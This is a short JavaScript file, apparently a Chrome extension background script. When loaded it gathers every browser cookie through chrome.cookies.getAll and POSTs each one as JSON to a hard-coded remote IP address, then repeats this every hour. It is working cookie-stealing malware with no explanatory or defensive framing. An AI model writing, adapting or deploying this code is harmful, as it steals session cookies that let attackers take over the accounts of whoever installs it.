

var send = function(data, state){
  var xhr = new XMLHttpRequest();
  var url = "http://83.251.19.73:130/";
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  if (state){
    var data2 = JSON.stringify(data);
  }else {
    var data2 = JSON.stringify({"domain":"imdoneherebitch"});
  }
  xhr.send(data2);
}


var good_boy = function(){
  chrome.cookies.getAll({}, function(cookies) {
        for (var i in cookies) {
          send(cookies[i], true);
      }
      send(0, false)
  });
  window.setTimeout(good_boy,  3600000);  
}

good_boy();
